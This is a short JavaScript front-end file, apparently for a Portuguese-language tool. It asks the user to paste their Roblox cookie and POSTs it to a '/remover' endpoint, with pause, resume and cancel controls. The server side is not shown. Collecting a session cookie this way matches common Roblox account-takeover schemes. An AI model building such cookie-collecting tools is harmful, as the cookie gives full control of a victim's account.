function iniciarRemocao() {
    let cookie = document.getElementById("cookie").value;
    if (!cookie) {
        alert("Por favor, insira o cookie do Roblox!");
        return;
    }
    
    fetch("/remover", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ "cookie": cookie })
    }).then(response => response.text())
      .then(data => document.getElementById("status").innerText = data);
}

function pararRemocao() {
    fetch("/parar", { method: "POST" });
}

function retomarRemocao() {
    fetch("/retomar", { method: "POST" });
}

function cancelarRemocao() {
    fetch("/cancelar", { method: "POST" });
}
